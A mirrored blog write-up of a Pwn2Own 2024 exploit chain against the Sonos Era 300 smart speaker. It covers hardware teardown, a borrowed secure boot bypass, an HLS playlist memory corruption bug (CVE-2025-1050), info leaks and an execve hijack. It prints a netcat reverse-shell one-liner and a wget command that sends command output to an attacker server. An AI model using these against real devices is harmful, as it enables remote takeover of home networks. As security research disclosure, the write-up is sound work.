---
title: "Streaming Zero-Fi Shells to Your Smart Speaker"
source: "ret2 Systems"
url: https://blog.ret2.io/2025/06/11/pwn2own-soho-2024-sonos-exploit/
published: 2025-06-11
fetched: 2026-11-19T11:35:50.129835+08:00
category: "智能家居"
score: 15.6
keywords: ["unauthenticated", "zero-day", "pwn2own", "nas", "trustzone", "nas"]
sha256: 7d053fdc78b37e66532beec8c547fb90dbe33d1a1e7f7e9ac0e2a1a7bd3bdc52
bytes: 38145
truncated: false
body_mode: fulltext
kind: practical
status: published
published_at: 2026-11-19T11:44:34.056544+08:00
---

# Streaming Zero-Fi Shells to Your Smart Speaker

> 来源：ret2 Systems · 2025-06-11 · [原文](https://blog.ret2.io/2025/06/11/pwn2own-soho-2024-sonos-exploit/)
> 自动抓取快照，仅供安全研究参考；版权归原作者所有。

## 收录理由

- **核心**：Pwn2Own SOHO 2024 上攻破 **Sonos Era 300 智能音箱**的完整利用链，ret2 复盘了从网络服务到代码执行的全过程。
- **价值**：消费级智能音箱的完整攻击链公开资料极少；对研究语音助手类设备的攻击面与加固点很有参考价值。
- **难度**：高：需要在无符号、带缓解措施的固件上完成利用。

In October 2024, RET2 participated in the “Small Office / Home Office” (SOHO) flavor of Pwn2Own, a competition which challenges top security researchers to compromise consumer-focused network devices. This includes popular smart speakers, routers, IP cameras, printers, and network-attached storage (NAS) devices.

One of the two devices we targeted this year was the Sonos Era 300, a high-end smart speaker which retails for around $500 USD. The Sonos layers several security technologies to establish a chain of trust rooted in hardware, protect device specific secrets (ARM Trustzone, eFuses), and harden its primary runtime service against active exploitation. For a category of devices historically derided as “junk hacking,” things have certainly changed.

In this post, we’ll touch on how past research was adapted to obtain a foothold on the device, providing us the necessary introspection to discover and exploit a powerful memory corruption vulnerability (CVE-2025-1050) in remotely accessible, unauthenticated attack surface, netting our exploit $60,000 USD from the competition.

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_title_card.jpg)

Jack Dates (far-right) of RET2 Systems attacking a Sonos Era 300 with a zero-day exploit at Pwn2Own 2024

 more

## Device Reconnaissance

Going into any Pwn2Own, we weigh several factors deciding which devices we want to attack. This can range from how personally interesting the device seems to us, the prize money assigned to it, how many other competitors we think will poke at it, and how much time we expect the research to take.

We picked the Sonos smart speaker primarily because there was some amount of recent public research against the product family that seemed like useful context for getting started. While there wasn’t any explicit research against the Sonos Era 300, we purchased it assuming there could be new functionality worth probing for vulnerabilities.

Previous Pwn2Own Sonos entries were also memory-corruption vulnerabilities, meaning remote attack surface involved native code, which aligned with our skills and experience.

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_smart_speakers_zdi.jpg)

The list of smart speaker devices from ZDI and their respective prizes for Pwn2Own 2024

We made careful note of the following works and reviewed them while waiting for our device to arrive:

- Shooting Yourself in the .flags – Jailbreaking the Sonos Era 100
- A 3-Year Tale of Hacking a Pwn2Own Target
- A Journey To Pwn And Own The Sonos One Speaker
- Dumping the Amlogic A113X Bootrom
- Smart Speaker Shenanigans: Making The SONOS One Sing
- Exploiting the Sonos One Speaker Three Different Ways: A Pwn2Own Toronto Highlight
- …

While it’s clear that Sonos products have received some real attention from high quality researchers in the past, being able to work off of prior research doesn’t necessarily mean it’s going to be an easy target to take on.

For example, Synacktiv described how Sonos was sure to enable all major compiler-based mitigations (Cookies, PIE, RELRO) following their 2021 entry, while Orange Tsai speculated that Sonos was aggressively monitoring and patching crashes produced by researchers in 2022. NCC also burned several important bootloader bugs in 2023 which seemed like they would have been really useful for establishing a foothold on the Sonos Era 300.

## Device Teardown

Tearing down the Sonos Era 300 is a little tricky, but everything we care about is confined to one main logic board. The “PSU” is integrated directly onto the main board rather than being a separate or modular unit which is a little unusual, and makes working with the logic side a bit more precarious with high voltage elements openly exposed on the bench.

The fit and finish on the unit is so precise that we basically wrote off ever re-assembling the device, too.

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_motherboard.jpg)

The main Sonos Era 300, logic board + PSU combo

Removing the shielding, the top side of the board has two real chips of interest: a Mediatek MT7921 (wifi/bluetooth) and an 8GB Kingston EMMC / flash chip. We did not end up conducting any hardware or software research into the Mediatek chipset for Pwn2Own so we will not be discussing it further.

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_flash_mtk.jpg)

A Mediatek MT7921 radio and Kingston EMMC on the top side of the Sonos Era 300 main logic board

On the bottom side of the board, we find the main CPU marked ‘S767e’ and some RAM chips under more shielding.

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_cpu.jpg)

CPU + RAM chips on the bottom of the Sonos Era 300 main logic board

Based on some googling and the work of previous researchers, the CPU appears to be an Amlogic chip, presumably the S905X3 or something pretty close to it. Even if we cannot find the exact chip, having a datasheet within the same family of chips / vendor can provide quite a bit of insight.

## Reading / Writing EMMC Flash

The first priority is for us to get a dump of the 8GB EMMC straight from the factory. This is useful for a number of reasons, as it could be an older firmware that may be hard or impossible to find online or elsewhere. It also provides a clean known-good backup in-case we accidentally update the device or brick it.

To do this, we need to locate some of the signal pins on the board. We take a few pictures of the PCB and begin overlaying them with ball diagrams from the datasheet (stretched, skewed, and scaled) to fit approximately where the chip footprint should be. This gives us a rough map of where signals may be popping out on the other side of the board.

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_ff_small.gif)

Marking up the top/bottom of the board using photoshop to map out EMMC signals traveling to the CPU

This often works quite well, with a bit of reasoning on both where traces emerge from the EMMC and how they route into the CPU based on its ball placements we can predict almost all of them before even probing the board.

While the EMMC chip has all eight data lines routed to the CPU, when “hardware hacking” it is common to wire up only one data line plus the CMD and CLK signals. This is sufficient for communicating with the EMMC chip in 1-bit / SD Mode to read or write its entire contents (albeit, slowly).

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_emmc.jpg)

30awg enameled copper wire connected to CLK + CMD + DAT0 to allow read/write of the Sonos Era 300 EMMC

To read or write to the EMMC (dump the flash, re-write it) we must apply power to the board. But to ensure we do not fight with the CPU trying to access the flash or boot from it once we apply power, you often want to try and hold the CPU in reset. This can be achieved by grounding the RESET# pin (active LOW), if you can find it!

Similar to what we did with the EMMC chip, we overlayed an inverted ball diagram of the CPU on the top side of the board roughly based on vias. This helped us reason about the BGA fanout (routing of traces, placement of vias) from the backside of the board without removing the chip.

There’s a mix of luck, experience, and context clues at play for this next image, but we were able to identify the RESET# pin as the following without needing to remove the CPU:

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_reset.jpg)

30awg enameled copper wire connecting to a scraped via we believe to be the CPU RESET# signal

We noticed the RESET# signal on the CPU ball diagram was mostly surrounded by unused GPIO pins. On the bottom side of the PCB in the region directly under that cluster of pins, there is a sole bypass capacitor with a thin trace to a single dedicated via (where the wire is attached in the image above). In fact, if you look closely, it is basically the only capacitor setup like this under the CPU.

In normal operation, slight disturbances on the RESET# line could cause the system to randomly reset, hence why a small bypass capacitor is common on RESET# lines to help keep the signal free of minor glitches. If RESET# is pulled to ground, it will hold the CPU in reset.

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_setup.jpg)

Sonos Era 300 with its UART, EMMC, RESET# signals tapped as our main research device

Anchoring a makeshift “debug” header along the edge of the board, we can route our probed EMMC lines and the RESET# signal to something more robust. This makes it so we don’t have to worry as much about stressing our enameled wire or breaking the tiny points we tapped while handling the board or moving it around the bench.

From the header, we can easily tie RESET# to ground and hook up the three EMMC signals (DAT0, CLK CMD) to a low voltage (1.8v) SD card reader. This allows us to supply power to the Sonos main board through normal means and read or write to the EMMC freely from Windows or Linux as if it were a standard SD card plugged into a computer.

After reading/writing the EMMC each time, we unplug the wires running to our SD reader and release the RESET# line from ground to allow the Sonos main board to boot normally again.

## Establishing a Foothold

Unsurprisingly, the firmware dump we obtained from the EMMC was almost entirely encrypted. But the brand new Sonos Era 300 we bought in August 2024 had a manufacture date of January 2024, about two months after NCC’s Sonos Era 100 bootloader bugs were allegedly patched (November 2023).

When manufacturing devices, it’s much safer to ship consumers old, well tested and known-good images and force users to update the device as part of the initial at-home setup. As suspected, we were able to not only confirm the applicability of NCC’s research to our Sonos Era 300 bootloader, but also port it over in just a few days.

```
...
Both headers OK, bootgens 0 2
uboot: section-1 selected
boot_state 0
## Error: Can't overwrite "bootargs"
## Error inserting "bootargs" variable, errno=1
364 byte kernel signature verified successfully
JTAG disabled
disable_usb: DISABLE_USB_BOOT fuse already set
disable_usb: DISABLE_JTAG fuse already set
disable_usb: DISABLE_M3_JTAG fuse already set
disable_usb: DISABLE_M4_JTAG fuse already set
srk_fuses: not revoking any more SRK keys (0x1)
srk_fuses: locking SRK revocation fuses
Start the watchdog timer before starting the kernel...
get_kernel_config [id = 3, rev = 7] returning 55
## Loading kernel from FIT Image at 00500048 ...
   Using 'conf@56' configuration
   Trying 'kernel@1' kernel subimage
     Description:  Sonos Linux kernel for S767
     Type:         Kernel Image
     Compression:  lz4 compressed
     Data Start:   0x00500130
     Data Size:    8992583 Bytes = 8.6 MiB
     Architecture: AArch64
...
```

NCC’s research saved us arguably several weeks of research time as the flaw allowed us to semi-blindly break the device’s strong chain of trust, encrypted bootloaders, kernel, and filesystem by combining several clever vulnerabilities to obtain a quick foothold directly into the Linux userspace.

The issue NCC exploited effectively allows for subtle but unauthorized manipulation of the U-Boot environment, such that we can specify custom U-Boot environment variables that get passed directly to the Linux kernel boot args.

We can abuse this classic form of boot arg injection to load a small initrd ramfs (ram-based Linux filesystem) we smuggle into the device flash alongside the encrypted kernel, booting the kernel directly into startup executables that we control within the ramfs rather than the normal file system.

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_shell.jpg)

Shell as root by way of NCC's secure boot bypass bugs (CVE-2023-50810)

This gives us execution as root over serial to the Linux kernel environment once the system is fully booted. With the shell as root on the system, we’re now free to start poking around their Linux environment, mount the real encrypted filesystem, extract executables of interest, and perform initial on-device research.

Once again, following NCC’s lead (per their posts’ epilogue) we adapted blasty’s a113x-el3 Trustzone exploit to dump the EL3 binary and OTP (eFuses) from our device.

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_dumping.gif)

Scraping memory and device-specific eFuse secrets out of the EL3 Trustzone runtime

Among other things, this gives us access to device specific keys which are supposed to be held only by the Trustzone. These keys are used to perform encryption/decryption of the firmware, updates, or for media DRM purposes. The Trustzone and its eFuses also specify things such as boot revocation, device-specific capabilities, and more.

While not strictly necessary, having these keys allows us to decrypt all future Sonos firmware updates using a simple python script on our host systems, without needing Sonos hardware or the Trustzone to serve as an oracle.

## Anacapad Overview

With our foothold established, we could verify with netstat that the major userspace process is anacapad, which matches previous research per our ‘recon’ into past vulnerabilities targeting Sonos products.

```
# netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:1843            0.0.0.0:*               LISTEN      1525/anacapad
tcp        0      0 0.0.0.0:1400            0.0.0.0:*               LISTEN      1525/anacapad
tcp        0      0 0.0.0.0:1410            0.0.0.0:*               LISTEN      1525/anacapad
tcp        0      0 0.0.0.0:1443            0.0.0.0:*               LISTEN      1525/anacapad
tcp        0      0 :::5000                 :::*                    LISTEN      1761/wacd
udp        0      0 0.0.0.0:6992            0.0.0.0:*                           1525/anacapad
udp        0      0 0.0.0.0:1900            0.0.0.0:*                           1525/anacapad
udp        0      0 0.0.0.0:12300           0.0.0.0:*                           1525/anacapad
udp        0      0 0.0.0.0:12301           0.0.0.0:*                           1525/anacapad
udp        0      0 0.0.0.0:53              0.0.0.0:*                           1519/netstartd
udp        0      0 0.0.0.0:67              0.0.0.0:*                           1519/netstartd
udp        0      0 10.69.69.1:41062        0.0.0.0:*                           1525/anacapad
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           1522/mdnsd
udp        0      0 10.69.69.1:35538        0.0.0.0:*                           1525/anacapad
udp        0      0 0.0.0.0:39640           0.0.0.0:*                           1525/anacapad
udp        0      0 0.0.0.0:6966            0.0.0.0:*                           1519/netstartd
udp        0      0 0.0.0.0:6969            0.0.0.0:*                           1519/netstartd
udp        0      0 0.0.0.0:6971            0.0.0.0:*                           1525/anacapad
udp        0      0 0.0.0.0:48961           0.0.0.0:*                           1522/mdnsd
udp        0      0 0.0.0.0:6981            0.0.0.0:*                           1525/anacapad
udp        0      0 0.0.0.0:6984            0.0.0.0:*                           1525/anacapad
udp        0      0 :::56479                :::*                                1522/mdnsd
udp        0      0 :::5353                 :::*                                1522/mdnsd
...
```

The service anacapad (presumably, “analog capabilities daemon”) is a monolithic binary that runs an HTTP server on port 1400, and handles essentially everything from a feature perspective of the Sonos smart speaker product.

This includes:

- Multi-speaker configuration
- Alarm clock notifications
- Media Handling

- Managing the queue of tracks
- Interacting with cloud music services
- Parsing / playing actual music
- …

Intended for in-home use, authentication is not a concern, and all of the HTTP endpoints implementing these features can be interacted with freely, without any kind of authentication on the local area network.

Notably, being the most high-risk to remote attacks, this process is also rather well hardened according to checksec, which will make remote exploitation of media codecs pretty interesting:

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_checksec.png)

## Media Parsing

Being more of a music / audio-oriented smart speaker, the largest feature is naturally playing media, which opens up a lot of attack surface for the various media codecs and streaming protocols it aims to support.

The anacapad infrastructure breaks up media consumption into two fundamental operations:

- Framing - parsing the initial media container to arrive at individual audio frames (of encoded audio data)

- e.g. making GET requests to download an mp4 file then parsing it
- performed by an object inheriting from AudioFramer
- Playing - decoding the audio frames into raw sample data (PCM) to be played by the speaker

- e.g. invoking the FLAC decoder on the encoded frames
- performed by an object inheriting from AudioPlayer

These happen in separate threads: chsrc (channel source) for framing, and chsnk (channel sink) for playing.

The music queue is a list of URIs of music to play. When chsrc pops off a URI from the queue, the following overall process occurs:

- It decides which concrete AudioFramer to use

- this might involve the URI scheme, file extension, and/or MIME type
- framer subclasses are obtained from a FramerFactory object
- It makes a virtual call framer->download(...)
- This requests the file (or implements a streaming protocol), determines the encoding, and parses out frames
- Frames are forwarded to notifyFrame, which is passed the raw buffer / size, and an encoding type enum
- chsnk thread receives the frame, and uses the encoding type enum to select the corresponding AudioPlayer

- player subclasses are obtained from an AudioPlayerFactory object
- A virtual call is made to player->play(...) with the encoded frame buffer / size
- The specific decoder is invoked to convert the frame to raw audio samples
- Sound!! 🎸 🤘

Since C++ RTTI is maintained in the binary, all class names are available to us. Full lists of the available framers and players are below:

| Framers | Players |
| AIFFAudioFramer
BuzzerAudioFramer
FLACAudioFramer
M4AAudioFramer
M4ARadioFramer
SonosADTSAudioFramer
HLSAudioFramer
MP3AudioFramer
MP3RadioFramer
OggVorbisAudioFramer
WAVAudioFramer
WMAAudioFramer
WMARadioFramer
SpotifyAudioFramer
SpotifyOggVorbisAudioFramer
RadioTimeRecentShowAudioFramer
RDASHAudioFramer | MP3AudioPlayer
WAVAudioPlayer
WMAAudioPlayer
M4AAudioPlayer
FLACAudioPlayer
OggVorbisAudioPlayer
ALACAudioPlayer
SBCAudioPlayer
HTAudioPlayer
EC3AudioPlayer
OPUSAudioPlayer
NullAudioPlayer
EncryptedAudioPlayer |

Each framer and player represent attack surface we can start researching.

## HLS Streaming

The specific vulnerability we ended up exploiting resided in the HLS streaming protocol. HLS (HTTP Live Streaming) is a protocol developed by Apple, described in RFC 8216.

The basic concept is to break up media into smaller segments, with clients downloading each segment one at a time as they become needed. For example, each segment might contain 10 seconds of an audio track.

Another major feature of HLS is adaptive-bitrate streaming, where the media stream can be encoded in a variety of different bitrates / qualities, with lower bitrate versions of the stream requiring less bandwidth. Clients can then dynamically switch between bitrates depending on the connection speed.

A client obtains the list of these segments / streams / metadata by initially downloading a top-level “extended M3U” playlist file, which has file extension .m3u or .m3u8. These are newline-delimited plaintext files, where metadata “tags” are on lines starting with #.

To clarify the context we are in, our attack will consist of giving the Sonos the URL of an M3U playlist to stream, which it will download from our controlled HTTP server.

## HLS Variant Streams

The variant streams with various bitrates are denoted in the playlist file with #EXT-X-STREAM-INF tags like so:

```
#EXT-X-STREAM-INF:<comma-separated-attribute-list>
<URI>
```

The most relevant attribute for us is BANDWIDTH=<integer>, indicating the bitrate / bandwidth for this variant stream. Normally, the URI on the second line would point to a separate M3U playlist solely for the individual stream.

Within anacapad, the top-level playlist is parsed into an HLSPlayList structure shown below (names are our own). This contains an array for up to 16 unique bandwidths, with each bandwidth having up to 4 streams. Note that this array is zero-initialized at the start of playlist parsing.

// sub-struct for specific bandwidth, container struct below has 16 of these

struct HLSPlayList::BREntry {

unsigned int bandwidth;

HLSPlayList::BREntry::Stream streams[4];

unsigned int nstreams;

};

struct HLSPlayList::BREntry::Stream {

char uri[8193];

char codec[33];

char progid[33];

char audio[33];

int bandwidth;

};

// larger container HLSPlayList structure

struct HLSPlayList {

...

HLSPlayList::BREntry brentries[16];

long nbrentries; // number of populated entries in preceding array

int br_idx; // index of entry for current bitrate (i.e. normally 0-15)

int stream_idx; // index of stream within entry (i.e. normally 0-3)

...

};

When the playlist parser encounters a #EXT-X-STREAM-INF tag, it calls storeStream, which performs the following:

- parses the attribute list into a temporary Stream on the stack
- calls helper function reserve_bandwidth_entry(playlist, bandwidth)
- if non-null, the return value is a reserved slot for the Stream
- if non-null, the stack temporary is copied into the reserved global array slot

The vulnerability arises when reserving bandwidth entries with abnormal inputs. Pseudocode for the operation is below:

storeStream(HLSPlayList* pl, char* rgchStreamURI, char* streaminf) {

// rgchStreamURI and streaminf (attributes list) will be parsed into this local

BREntry::Stream tmp_stream;

// ... parsing ...

// reserve slot and copy

BREntry::Stream* dest = HLSPlayList::reserve_bandwidth_entry(pl, tmp_stream.bandwidth);

if ( dest )

memcpy(dest, &tmp_stream, sizeof(tmp_stream));

}

reserve_bandwidth_entry(HLSPlayList *pl, int bandwidth) {

// Case 1: bandwidth already exists

// search the array for a matching bandwidth

// then reserve a stream slot if less than 4 streams already

for ( int i = 0; i != 16; ++i ) {

if ( pl->brentries[i].bandwidth == bandwidth ) {

// reserve slot if enough room...

if ( pl->brentries[i].nstreams < 4 ) {

int slot = pl->brentries[i].nstreams++;

return &pl->brentries[i].streams[slot];

}

// ...if not enough room, return null

return NULL;

}

}

// Case 2: brand new bandwidth

// search for an empty slot in the array of 16 BREntry

// a slot is considered unused if its bandwidth is 0

for ( int i = 0; i != 16; ++i ) {

if ( pl->brentries[i].bandwidth == 0 ) {

pl->nbrentries++;

pl->brentries[i].bandwidth = bandwidth;

int slot = pl->brentries[i].nstreams++;

return &pl->brentries[i].streams[slot];

}

}

return NULL;

}

Consider what happens when this code executes if we specify BANDWIDTH=0…

First, it will check the array for a matching bandwidth, which does in fact exist, considering the bandwidth values are initialized to zero. A slot in this zero-bandwidth entry will be reserved, incrementing nstreams to 1. This puts the array entry in a “weird state” where one of the streams is populated, but the bandwidth of zero indicates the entry is unused. We can add 3 more streams with zero bandwidth to further this state, incrementing nstreams to its maximum of 4.

Now, imagine we add a stream with non-zero bandwidth. No such bandwidth already exists in the array, so we’ll hit case 2 to populate a brand new entry. This searches for an available slot in the array, where available is defined as a bandwidth of zero… This will find our “weird” entry that’s seemingly “unused” yet has nstreams set to 4.

What happens next is that the reserved slot will be for stream index 4, which is out-of-bounds. Notice that there is no bounds check for nstreams in case 2, since an unused entry is assumed to be untouched from its zero-initialized state.

After reserve_bandwidth_entry returns the out-of-bounds stream slot, storeStream proceeds to memcpy its local stream instance into the out-of-bounds memory.

An illustration of what happens to the struct fields as the variant streams are parsed:

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_band0.svg)

## Controlling the Overflow - Null Bytes

The primitive we gain is corrupting memory adjacent to a BREntry structure. The current entry’s nstreams will always be corrupted, followed by whatever is after the BREntry. Recall that this is within an array of 16 BREntry structures, so triggering the overflow from entries of index 0 to 14 will only corrupt the next BREntry, which is relatively useless (since we’d only corrupt the bandwidth field and the string fields of the first Stream).

However, padding the array with 15 filler bandwidth entries, then triggering the overflow, we’ll be able to corrupt whatever fields come afterwards in the larger HLSPlayList container structure (note that the structure is large enough that the overflow can not hit adjacent allocations).

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_overflow_fields.svg)

Before we look into how we can leverage some of these fields, we need to understand if our overflow has any constraints (namely, if we can embed null bytes or not).

If we look back at the Stream structure, the majority is the first field, a char[8193] for the stream’s URI. This comes from the second line of the variant stream definition (after the #EXT-X-STREAM-INF line), meaning we control it. However, being a string, null bytes are naturally not an option (technically, since the playlist file is newline-delimited, newline/carriage-return characters are also not an option).

This is where we can take advantage of how the code is written. Recall that the Stream structure is parsed into a temporary local on the stack, after which it gets copied into a slot in the heap-structure’s brentries array. Initialization of this temporary local only nulls out the first byte of each character array field (as opposed to memset-ing the entire thing). In other words, the contents copied onto the heap can contain uninitialized stack memory.

This has two significant consequences:

- We can embed null bytes by placing nulls during previous iterations with successively shorter strings

- for bandwidth entries that already have 4 streams, the stream is ignored, so we can utilize as many “setup” iterations as we need
- The uninitialized stack contents copied onto the heap may contain useful values (e.g. code/stack pointers, the stack cookie) that we’ll want to leak later

Using the successively-shorter-strings technique, we can setup arbitrary payloads for the overflow containing nulls.

## Inducing a Stack BOF

With a precisely-controlled overflow, we now want to look for fields in HLSPlayList that we can corrupt with useful consequences. As we continued reversing the playlist parsing logic, we arrived at an interesting post-processing step for pruning certain streams.

Variant streams can specify an attribute with a list of codecs i.e. CODEC="<codec1>,<codec2>,...". If both ALAC and EC-3 codecs were used by variant streams within the playlist, this post-processing step is invoked to remove any streams where the first codec in this list is ALAC.

We’ll call the post-processing function remove_alac_streams. It performs the filtering by iterating over the streams within the brentries array and copying any non-ALAC streams into a temporary stack array. Afterwards, it copies the entire stack temporary back onto the heap brentries array.

Given the vulnerability, the issue becomes that the loop iterations are based on corrupted values like nstreams. If nstreams is larger than the intended maximum of 4, this copy-loop may copy into out-of-bounds stream slots on the stack, resulting in a stack buffer overflow. Assuming we had leaks, this would be a path to a simple win by overwriting a saved link register.

For completeness, pseudocode of this function is shown here:

void HLSPlayList::remove_alac_streams(HLSPlayList *pl) {

HLSPlayList::BREntry filtered[16] = {0};

int filtered_outidx = 0;

// iterate over all entries

for (int i = 0; i < pl->nbrentries; i++) {

// iterate over all streams

int filtered_stidx = 0;

for (int st = 0; st < pl->brentries[i].nstreams; st++) {

// if non-alac, copy it over into the local array

if (strcasecmp(pl->brentries[i].streams[st].codec, "alac")) {

memcpy(&filtered[filtered_outidx].streams[filtered_stidx],

&pl->brentries[i].streams[st],

sizeof(...));

filtered_stidx++;

}

}

// only execute if some streams were actually copied

if (filtered_stidx != 0) {

filtered[filtered_outidx].bandwidth = pl->brentries[i].bandwidth;

filtered[filtered_outidx].nstreams = filtered_stidx;

filtered_outidx++;

}

}

// copy over the local array

pl->nbrentries = filtered_outidx;

memcpy(pl->brentries, filtered, sizeof(pl->brentries));

}

Unfortunately, there is one small nuance in the stack frame / structure layout we need to deal with first…

### Controlling the Stack Overflow

The structures we are copying to/from are identical. Unless there is a “misalignment” due to removal of an ALAC stream, the offset into the source heap array for the copy will always be the same as the offset into the destination stack array.

Removing an ALAC stream will cause the offsets to differ. However, our vulnerability only allows writing a single stream out-of-bounds. To demonstrate, without any removals, writing to the stack array +1 OOB would copy from the heap source +1 OOB, which precisely copies from the single stream we wrote out-of-bounds. If we perform a removal, writing +1 OOB on the stack would copy from +2 OOB on the heap, which would be from further adjacent fields in the HLSPlayList that we currently don’t control the contents of…

With that in mind, let’s consider what happens if we don’t perform removals, and copy our single out-of-bounds stream onto the stack. This is how the stack frame (destination for the copy) and the HLSPlayList (source of the copy) overlay:

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_cookie_overlap.svg)

Critically, nbrentries (which is the number of entries populated in the preceding brentries array) is at the same offset as the stack cookie. nbrentries determines the outer loop iteration count in remove_alac_streams, so must be some small integer to avoid copying “forever” and hitting unmapped memory. Meanwhile, the stack cookie will almost definitely not be some small integer…

Clearly, these values can not be the same if we’re to successfully trigger a stack overflow in remove_alac_streams. As a side note, the stack cookie is implemented with the compiler-provided libssp, which uses a __stack_chk_guard_ptr in the GOT pointing to the cookie in libssp’s data section, as opposed to TLS (thread-local storage). This precludes any CTF-style tricks of overwriting the cookie itself by overflowing far enough down the thread stack to corrupt TLS.

Our only option is to “misalign” the copy offsets by removing an ALAC stream. As noted before, this puts the source of the copy further out-of-bounds within the HLSPlayList structure, so we’ll need to understand how to control those HLSPlayList fields.

### Controlling the Track List

Fortunately, these further fields in the HLSPlayList are some sort of track list, an array of tracks where each contains some metadata along with a URI. These tracks are actually the segmented media chunks of the HLS stream (i.e. the first N seconds of audio, next N seconds, and so on…), so are specified in the playlist file (i.e. we control them).

Specifically, the source for the out-of-bounds copy will come from partially within the URI buffer of the first track. In order to control the contents of this URI, we’ll utilize the same null-byte-embedding technique of using successively shorter strings. The track list has enough room for 16 tracks which are populated in a ring-buffer-esque style, where the 17th track will be written to index 0 (overwriting the original contents from the 1st track). Looping the track list back to index 0 enables us to send strings repeatedly to implement the null-embedding technique.

## Info Leaks

Now that we understand how to trigger a stack overflow in remove_alac_streams with a precisely-controlled payload, all we need are leaks to meaningfully hijack control flow.

Recall the following fields within the HLSPlayList structure that we can corrupt:

struct HLSPlayList {

...

HLSPlayList::BREntry brentries[16];

long nbrentries; // number of populated entries in preceding array

int br_idx; // index of entry for current bitrate (i.e. normally 0-15)

int stream_idx; // index of stream within entry (i.e. normally 0-3)

...

};

br_idx determines the index into brentries, while stream_idx determines the index into that entry’s array of streams. In combination, these define the currently selected stream.

After the HLS playlist parser has consumed the top-level playlist and wants to start streaming, it fetches an inner playlist from the URI field of the currently selected stream. If it’s a non-absolute URL, the host/port from the top-level playlist are prepended to make the actual HTTP request. If we corrupt br_idx / stream_idx to point at an out-of-bounds URI, we can get our leaks by observing the requested URI received by our HTTP server.

Recall that the string fields of the streams within the brentries array were copied from stack locals containing uninitialized stack memory. This means all the values of interest are somewhere within those uninitialized contents copied onto the heap, it just comes down to finding the right br_idx / stream_idx values to produce the desired offset from br_idx * sizeof(BREntry) + stream_idx * sizeof(Stream).

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_uninit_leak.svg)

Each trigger of the vulnerability will produce one leak, so we’ll need to send several playlists in succession to obtain all of our leaks:

- a text pointer (giving us a text leak for gadgets / etc)
- a stack pointer (we have controlled data on the stack we’ll use as function arguments)
- the stack cookie (unlike glibc, the libssp implementation did not seem to place a null in the lowest byte, meaning the cookie can be fully leaked when interpreted as a string)

## Code Execution

With leaks acquired, we can send our final crafted playlist file to induce the stack overflow in remove_alac_streams.

The layout of the stack frame has a bunch of callee-saved registers (including the link register) directly after the cookie. We corrupt LR with a COP (call-oriented-programming) gadget to turn this into an arbitrary function call with three controlled arguments:

mov x1, x23

mov x0, x21

mov x2, x20

blr x22

We direct this to the execve stub in the PLT, and setup the arguments to point at strings / argv arrays on the stack to execute /bin/sh -c <cmd>.

This gives us arbitrary shell command execution. To turn this into an interactive shell, we’ll need to spawn a connect-back, which requires creating a FIFO on a busybox-based system:

```
rm -f f;mknod f p;cat f|/bin/sh -i 2>&1|nc ip 1337 >f
```

The only nuance is we must be in a directory in which we have permission to create files. Incidentally, this gave us a bit of a scare at the actual competition… as our exploit seemingly did not land initially, despite being tested beforehand on a vanilla-configured retail device.

![image](https://blog.ret2.io/assets/img/pwn2own_soho24_sonos_meme1.jpg)

source

We soon realized we were in fact getting code execution through execve, but for some reason the connect-back wasn’t hitting. In the chaos of trying to figure things out “on-stage” we ended up switching the fully interactive connect-back for a simple wget ip:port/$(arbitrary command here) (where our HTTP server would log the request URI containing the command output), but our best guess is that simply changing the path of the created FIFO would’ve solved the issue.

The specific path we were using was /jffs/settings, which for some reason was writable on the device we had purchased, but not on the competition device. It just goes to show that anything can happen once you’re on the actual Pwn2Own stage! With the potential lesson-learned here being to have backups for demonstrating code execution and/or double-checking basic assumptions about the device environment.

## Conclusion

To recap the overall flow of the exploit:

- send 3 playlist files to obtain leaks (text + stack + cookie)
- send a benign playlist to populate the track list
- send a playlist to induce the stack overflow
- redirect to execve for arbitrary code execution

Overall, we found the Sonos a moderately challenging target that felt very rewarding to exploit, and it was fun to participate in the Pwn2Own event in-person as well.

The encrypted firmware / hardware security situation definitely raises the difficulty significantly of performing research. If NCC had not published their bootloader work, or if we did not have someone with the necessary hardware experience to replicate it, we simply would not have been able to perform meaningful research in time. That said, this form of security only hinders getting the code, which once obtained, is almost certain to have bugs.

The full exploit code for CVE-2025-1050 has been released for educational purposes on GitHub here.
